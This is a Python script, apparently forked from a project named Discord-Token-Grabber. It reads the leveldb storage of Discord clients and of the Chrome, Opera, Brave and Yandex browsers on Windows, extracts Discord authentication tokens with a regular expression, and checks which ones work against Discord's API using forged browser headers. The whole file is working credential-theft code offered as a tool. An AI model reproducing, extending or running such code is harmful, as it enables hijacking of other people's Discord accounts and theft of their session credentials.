"""
Forked from https://github.com/wodxgod/Discord-Token-Grabber
"""

from fake_headers import Headers
import requests
import os
import re

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{38}', line):
                tokens.append(token)
    return tokens


def check(token):
    headers = Headers(browser="chrome", os="win", headers=True ).generate()
    headers.update({'Authorization': token})
    return requests.get("https://discord.com/api/v8/users/@me/settings", headers= headers).status_code == 200

def snatch():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    tokens = []
    [[tokens.append(token) if len(token) > 0 else 0 for token in find_tokens(path)] if os.path.exists(path) else 0 for _, path in paths.items()]
    return tokens


if __name__ == '__main__':
    print(snatch())
    input()
    